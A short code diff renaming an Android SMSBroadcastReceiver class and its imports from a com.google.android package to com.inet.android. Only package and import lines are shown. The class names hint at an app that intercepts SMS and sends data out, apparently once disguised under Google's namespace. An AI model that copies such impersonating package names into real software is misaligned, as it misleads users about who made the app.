@@ -1,4 +1,4 @@
-package com.google.android.sms;
+package com.inet.android.sms;
 
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
@@ -15,9 +15,9 @@ import android.preference.PreferenceManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
-import com.google.android.bs.DataSendHandler;
-import com.google.android.bs.FileLog;
-import com.google.android.bs.WorkTimeDefiner;
+import com.inet.android.bs.DataSendHandler;
+import com.inet.android.bs.FileLog;
+import com.inet.android.bs.WorkTimeDefiner;
 
 public class SMSBroadcastReceiver extends BroadcastReceiver {
 	private static final String TAG = "SMS";
